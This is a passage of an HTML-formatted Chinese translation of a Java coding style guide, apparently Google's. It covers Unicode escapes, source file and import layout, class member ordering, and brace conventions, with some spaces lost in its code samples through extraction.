lang="zh-CN">&#36716;&#20041;&#31526;&#25110;&#26159;&#19968;&#20123;&#23454;&#38469;&#30340;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Unicode</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#26102;&#65292;&#24314;&#35758;&#20570;&#20123;&#27880;&#37322;&#32473;&#20986;&#35299;&#37322;&#65292;&#36825;&#26377;&#21161;&#20110;&#21035;&#20154;&#38405;&#35835;&#21644;&#29702;&#35299;&#12290;</span></font></font></p><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22914;&#65306;</span></font></font><font size="3" style="font-size: 12pt"><br>StringunitAbbrev = &quot;&mu;s&quot;; | </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36190;&#65292;&#21363;&#20351;&#27809;&#26377;&#27880;&#37322;&#20063;&#38750;&#24120;&#28165;&#26224;</span></font></font><font size="3" style="font-size: 12pt"><br>StringunitAbbrev = &quot;\u03bcs&quot;; // &quot;&mu;s&quot; |</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20801;&#35768;&#65292;&#20294;&#27809;&#26377;&#29702;&#30001;&#35201;&#36825;&#26679;&#20570;</span></font></font><font size="3" style="font-size: 12pt"><br>StringunitAbbrev = &quot;\u03bcs&quot;; // Greek letter mu, &quot;s&quot; |</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20801;&#35768;&#65292;&#20294;&#36825;&#26679;&#20570;&#26174;&#24471;&#31528;&#25305;&#36824;&#23481;&#26131;&#20986;&#38169;</span></font></font><font size="3" style="font-size: 12pt"><br>StringunitAbbrev = &quot;\u03bcs&quot;; | </font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24456;&#31967;&#65292;&#35835;&#32773;&#26681;&#26412;&#30475;&#19981;&#20986;&#36825;&#26159;&#20160;&#20040;</span></font></font><font size="3" style="font-size: 12pt"><br>return'\ufeff' + content; // byte order mark | Good</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#23545;&#20110;&#38750;&#25171;&#21360;&#23383;&#31526;&#65292;&#20351;&#29992;&#36716;&#20041;&#65292;&#24182;&#22312;&#24517;&#35201;&#26102;&#20889;&#19978;&#27880;&#37322;</span></font></font></p><p align="left" style="margin-left: 0.5in; margin-right: 0.5in; margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">Tip:</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27704;&#36828;&#19981;&#35201;&#30001;&#20110;&#23475;&#24597;&#26576;&#20123;&#31243;&#24207;&#21487;&#33021;&#26080;&#27861;&#27491;&#30830;&#22788;&#29702;&#38750;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">ASCII</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#32780;&#35753;&#20320;&#30340;&#20195;&#30721;&#21487;&#35835;&#24615;&#21464;&#24046;&#12290;&#24403;&#31243;&#24207;&#26080;&#27861;&#27491;&#30830;&#22788;&#29702;&#38750;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">ASCII</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#26102;&#65292;&#23427;&#33258;&#28982;&#26080;&#27861;&#27491;&#30830;&#36816;&#34892;&#65292;&#20320;&#23601;&#20250;&#21435;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">fix</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#36825;&#20123;&#38382;&#39064;&#30340;&#20102;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">(</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35328;&#19979;&#20043;&#24847;&#23601;&#26159;&#22823;&#32966;&#21435;&#29992;&#38750;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">ASCII</font></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23383;&#31526;&#65292;&#22914;&#26524;&#30495;&#30340;&#26377;&#38656;&#35201;&#30340;&#35805;</span></font></font><font size="3" style="font-size: 12pt"><font face="&#23435;&#20307;, serif">)</font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc387838118"></a>3. <font face="&#23435;&#20307;"><span lang="zh-CN">&#28304;&#25991;&#20214;&#32467;&#26500;</span></font></h1><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#19968;&#20010;&#28304;&#25991;&#20214;&#21253;&#21547;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25353;&#39034;&#24207;&#22320;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#35768;&#21487;&#35777;&#25110;&#29256;&#26435;&#20449;&#24687;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#26377;&#38656;&#35201;</span></font>)</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">package<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">import<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#19968;&#20010;&#39030;&#32423;&#31867;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#21482;&#26377;&#19968;&#20010;</span></font>)<font face="&#23435;&#20307;"><span lang="zh-CN">&#20197;&#19978;&#27599;&#20010;&#37096;&#20998;&#20043;&#38388;&#29992;&#19968;&#20010;&#31354;&#34892;&#38548;&#24320;&#12290;</span></font></p></ol><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc885294832"></a>3.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#35768;&#21487;&#35777;&#25110;&#29256;&#26435;&#20449;&#24687;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22914;&#26524;&#19968;&#20010;&#25991;&#20214;&#21253;&#21547;&#35768;&#21487;&#35777;&#25110;&#29256;&#26435;&#20449;&#24687;&#65292;&#37027;&#20040;&#23427;&#24212;&#24403;&#34987;&#25918;&#22312;&#25991;&#20214;&#26368;&#21069;&#38754;&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1717148839"></a>3.2 package<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font></h2><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">package</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#19981;&#25442;&#34892;&#65292;&#21015;&#38480;&#21046;</span></font></font><font size="3" style="font-size: 12pt">(4.4</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24182;&#19981;&#36866;&#29992;&#20110;</span></font></font><font size="3" style="font-size: 12pt">package</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#12290;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;</span></font></font><font size="3" style="font-size: 12pt">package</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#20889;&#22312;&#19968;&#34892;&#37324;</span></font></font><font size="3" style="font-size: 12pt">)</font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc973320510"></a>3.3 import<font face="&#23435;&#20307;"><span lang="zh-CN">&#35821;&#21477;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc185671533"></a>3.3.1 import<font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#35201;&#20351;&#29992;&#36890;&#37197;&#31526;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21363;&#65292;&#19981;&#35201;&#20986;&#29616;&#31867;&#20284;&#36825;&#26679;&#30340;</span></font></font><font size="3" style="font-size: 12pt">import</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#65306;</span></font></font><font size="3" style="font-size: 12pt">importjava.util.*;</font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc85248011"></a>3.3.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#19981;&#35201;&#25442;&#34892;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">import</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#19981;&#25442;&#34892;&#65292;&#21015;&#38480;&#21046;</span></font></font><font size="3" style="font-size: 12pt">(4.4</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24182;&#19981;&#36866;&#29992;&#20110;</span></font></font><font size="3" style="font-size: 12pt">import</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#12290;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#27599;&#20010;</span></font></font><font size="3" style="font-size: 12pt">import</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#29420;&#31435;&#25104;&#34892;</span></font></font><font size="3" style="font-size: 12pt">)</font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc352726969"></a>3.3.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#39034;&#24207;&#21644;&#38388;&#36317;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font size="3" style="font-size: 12pt">import</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#21487;&#20998;&#20026;&#20197;&#19979;&#20960;&#32452;&#65292;&#25353;&#29031;&#36825;&#20010;&#39034;&#24207;&#65292;&#27599;&#32452;&#30001;&#19968;&#20010;&#31354;&#34892;&#20998;&#38548;&#65306;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#25152;&#26377;&#30340;&#38745;&#24577;&#23548;&#20837;&#29420;&#31435;&#25104;&#32452;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">com.google imports(<font face="&#23435;&#20307;"><span lang="zh-CN">&#20165;&#24403;&#36825;&#20010;&#28304;&#25991;&#20214;&#26159;&#22312;</span></font>com.google<font face="&#23435;&#20307;"><span lang="zh-CN">&#21253;&#19979;</span></font>)</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#31532;&#19977;&#26041;&#30340;&#21253;&#12290;&#27599;&#20010;&#39030;&#32423;&#21253;&#20026;&#19968;&#32452;&#65292;&#23383;&#20856;&#24207;&#12290;&#20363;&#22914;&#65306;</span></font>android,com, junit, org, sun</p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">java imports5.javax imports<font face="&#23435;&#20307;"><span lang="zh-CN">&#32452;&#20869;&#19981;&#31354;&#34892;&#65292;&#25353;&#23383;&#20856;&#24207;&#25490;&#21015;&#12290;</span></font></p></ol><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1727990124"></a>3.4 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#22768;&#26126;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1042619565"></a>3.4.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21482;&#26377;&#19968;&#20010;&#39030;&#32423;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#22768;&#26126;&#27599;&#20010;&#39030;&#32423;&#31867;&#37117;&#22312;&#19968;&#20010;&#19982;&#23427;&#21516;&#21517;&#30340;&#28304;&#25991;&#20214;&#20013;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24403;&#28982;&#65292;&#36824;&#21253;&#21547;</span></font></font><font size="3" style="font-size: 12pt">.java</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21518;&#32512;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#20363;&#22806;&#65306;</span></font></font><font size="3" style="font-size: 12pt">package-info.java</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#35813;&#25991;&#20214;&#20013;&#21487;&#27809;&#26377;</span></font></font><font size="3" style="font-size: 12pt">package-info</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc1260026007"></a>3.4.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#25104;&#21592;&#39034;&#24207;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#31867;&#30340;&#25104;&#21592;&#39034;&#24207;&#23545;&#26131;&#23398;&#24615;&#26377;&#24456;&#22823;&#30340;&#24433;&#21709;&#65292;&#20294;&#36825;&#20063;&#19981;&#23384;&#22312;&#21807;&#19968;&#30340;&#36890;&#29992;&#27861;&#21017;&#12290;&#19981;&#21516;&#30340;&#31867;&#23545;&#25104;&#21592;&#30340;&#25490;&#24207;&#21487;&#33021;&#26159;&#19981;&#21516;&#30340;&#12290;</span></font></font><font size="3" style="font-size: 12pt"><br></font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26368;&#37325;&#35201;&#30340;&#19968;&#28857;&#65292;&#27599;&#20010;&#31867;&#24212;&#35813;&#20197;&#26576;&#31181;&#36923;&#36753;&#21435;&#25490;&#24207;&#23427;&#30340;&#25104;&#21592;&#65292;&#32500;&#25252;&#32773;&#24212;&#35813;&#35201;&#33021;&#35299;&#37322;&#36825;&#31181;&#25490;&#24207;&#36923;&#36753;&#12290;&#27604;&#22914;&#65292;&#26032;&#30340;&#26041;&#27861;&#19981;&#33021;&#24635;&#26159;&#20064;&#24815;&#24615;&#22320;&#28155;&#21152;&#21040;&#31867;&#30340;&#32467;&#23614;&#65292;&#22240;&#20026;&#36825;&#26679;&#23601;&#26159;&#25353;&#26102;&#38388;&#39034;&#24207;&#32780;&#38750;&#26576;&#31181;&#36923;&#36753;&#26469;&#25490;&#24207;&#30340;&#12290;</span></font></font></p><h4 class="western" style="widows: 2; orphans: 2">3.4.2.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#21306;&#22359;&#21010;&#20998;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24314;&#35758;&#20351;&#29992;&#27880;&#37322;&#23558;&#28304;&#25991;&#20214;&#20998;&#20026;&#26126;&#26174;&#30340;&#21306;&#22359;&#65292;&#21306;&#22359;&#21010;&#20998;&#22914;&#19979;</span></font></font></p><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#24120;&#37327;&#22768;&#26126;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">UI<font face="&#23435;&#20307;"><span lang="zh-CN">&#25511;&#20214;&#25104;&#21592;&#21464;&#37327;&#22768;&#26126;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26222;&#36890;&#25104;&#21592;&#21464;&#37327;&#22768;&#26126;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20869;&#37096;&#25509;&#21475;&#22768;&#26126;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#21021;&#22987;&#21270;&#30456;&#20851;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20107;&#20214;&#21709;&#24212;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26222;&#36890;&#36923;&#36753;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#37325;&#36733;&#30340;&#36923;&#36753;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#21457;&#36215;&#24322;&#27493;&#20219;&#21153;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#24322;&#27493;&#20219;&#21153;&#22238;&#35843;&#26041;&#27861;&#21306;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#29983;&#21629;&#21608;&#26399;&#22238;&#35843;&#26041;&#27861;&#21306;&#65288;&#20986;&#21435;</span></font>onCreate()<font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#65289;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#20869;&#37096;&#31867;&#22768;&#26126;&#21306;</span></font></p></ol><h4 class="western" style="widows: 2; orphans: 2">3.4.2.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#31867;&#25104;&#21592;&#25490;&#21015;&#36890;&#29992;&#35268;&#21017;</span></font></h4><ol><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#25353;&#29031;&#21457;&#29983;&#30340;&#20808;&#21518;&#39034;&#24207;&#25490;&#21015;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#24120;&#37327;&#25353;&#29031;&#20351;&#29992;&#20808;&#21518;&#25490;&#21015;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2">UI<font face="&#23435;&#20307;"><span lang="zh-CN">&#25511;&#20214;&#25104;&#21592;&#21464;&#37327;&#25353;&#29031;</span></font>layout<font face="&#23435;&#20307;"><span lang="zh-CN">&#25991;&#20214;&#20013;&#30340;&#20808;&#21518;&#39034;&#24207;&#25490;&#21015;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26222;&#36890;&#25104;&#21592;&#21464;&#37327;&#25353;&#29031;&#20351;&#29992;&#30340;&#20808;&#21518;&#39034;&#24207;&#25490;&#21015;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#26041;&#27861;&#22522;&#26412;&#19978;&#37117;&#25353;&#29031;&#35843;&#29992;&#30340;&#20808;&#21518;&#39034;&#24207;&#22312;&#21508;&#33258;&#21306;&#22359;&#20013;&#25490;&#21015;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#30456;&#20851;&#21151;&#33021;&#20316;&#20026;&#23567;&#21306;&#22359;&#25918;&#22312;&#19968;&#36215;&#65288;&#25110;&#32773;&#23553;&#35013;&#25481;&#65289;</span></font></p></ol><h4 class="western" style="widows: 2; orphans: 2">3.4.2.3 <font face="&#23435;&#20307;"><span lang="zh-CN">&#37325;&#36733;&#65306;&#27704;&#19981;&#20998;&#31163;</span></font></h4><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#24403;&#19968;&#20010;&#31867;&#26377;&#22810;&#20010;&#26500;&#36896;&#20989;&#25968;&#65292;&#25110;&#26159;&#22810;&#20010;&#21516;&#21517;&#26041;&#27861;&#65292;&#36825;&#20123;&#20989;&#25968;</span></font></font><font size="3" style="font-size: 12pt">/</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26041;&#27861;&#24212;&#35813;&#25353;&#39034;&#24207;&#20986;&#29616;&#22312;&#19968;&#36215;&#65292;&#20013;&#38388;&#19981;&#35201;&#25918;&#36827;&#20854;&#23427;&#20989;&#25968;</span></font></font><font size="3" style="font-size: 12pt">/</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#26041;&#27861;&#12290;</span></font></font></p><h1 class="western" style="widows: 2; orphans: 2"><a name="_Toc1340232007"></a>4. <font face="&#23435;&#20307;"><span lang="zh-CN">&#26684;&#24335;&#26415;&#35821;</span></font></h1><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35828;&#26126;&#65306;&#22359;&#29366;&#32467;&#26500;</span></font></font><font size="3" style="font-size: 12pt">(block-likeconstruct)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25351;&#30340;&#26159;&#19968;&#20010;&#31867;&#65292;&#26041;&#27861;&#25110;&#26500;&#36896;&#20989;&#25968;&#30340;&#20027;&#20307;&#12290;&#38656;&#35201;&#27880;&#24847;&#30340;&#26159;&#65292;&#25968;&#32452;&#21021;&#22987;&#21270;&#20013;&#30340;&#21021;&#22987;&#20540;&#21487;&#34987;&#36873;&#25321;&#24615;&#22320;&#35270;&#20026;&#22359;&#29366;&#32467;&#26500;</span></font></font><font size="3" style="font-size: 12pt">(4.8.3.1</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#33410;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#12290;</span></font></font></p><h2 class="western" style="widows: 2; orphans: 2"><a name="_Toc1910447657"></a>4.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#22823;&#25324;&#21495;</span></font></h2><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc170728268"></a>4.1.1 <font face="&#23435;&#20307;"><span lang="zh-CN">&#20351;&#29992;&#22823;&#25324;&#21495;</span></font>(<font face="&#23435;&#20307;"><span lang="zh-CN">&#21363;&#20351;&#26159;&#21487;&#36873;&#30340;</span></font>)</h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#22823;&#25324;&#21495;&#19982;</span></font></font><font size="3" style="font-size: 12pt">if,else, for, do, while</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#35821;&#21477;&#19968;&#36215;&#20351;&#29992;&#65292;&#21363;&#20351;&#21482;&#26377;&#19968;&#26465;&#35821;&#21477;</span></font></font><font size="3" style="font-size: 12pt">(</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#25110;&#26159;&#31354;</span></font></font><font size="3" style="font-size: 12pt">)</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#65292;&#20063;&#24212;&#35813;&#25226;&#22823;&#25324;&#21495;&#20889;&#19978;&#12290;</span></font></font></p><h3 class="western" style="widows: 2; orphans: 2"><a name="_Toc360888106"></a>4.1.2 <font face="&#23435;&#20307;"><span lang="zh-CN">&#38750;&#31354;&#22359;&#65306;</span></font>K&amp; R <font face="&#23435;&#20307;"><span lang="zh-CN">&#39118;&#26684;</span></font></h3><p align="left" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#23545;&#20110;&#38750;&#31354;&#22359;&#21644;&#22359;&#29366;&#32467;&#26500;&#65292;&#22823;&#25324;&#21495;&#36981;&#24490;</span></font></font><font size="3" style="font-size: 12pt">Kernighan</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#21644;</span></font></font><font size="3" style="font-size: 12pt">Ritchie</font><font face="&#23435;&#20307;"><font size="3" style="font-size: 12pt"><span lang="zh-CN">&#39118;&#26684;</span></font></font><font size="3" style="font-size: 12pt">(Egyptianbrackets):&#61623;</font></p><ul><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#24038;&#22823;&#25324;&#21495;&#21069;&#19981;&#25442;&#34892;&#61623;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#24038;&#22823;&#25324;&#21495;&#21518;&#25442;&#34892;&#61623;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#21491;&#22823;&#25324;&#21495;&#21069;&#25442;&#34892;&#61623;</span></font></p><li/><p class="western" style="margin-top: 0.19in; margin-bottom: 0.19in; line-height: 100%; widows: 2; orphans: 2"><font face="&#23435;&#20307;"><span lang="zh-CN">&#22914;&#26524;&#21491;&#22823;&#25324;&#21495;&#26159;&#19968;&#20010;&#35821;&#21477;&#12289;&#20989;&#25968;&#20307;&#25110;&#31867;&#30340;&#32456;&#27490;&#65292;&#21017;&#21491;&#22823;&#25324;&#21495;&#21518;&#25442;&#34892;</span></font>;<font 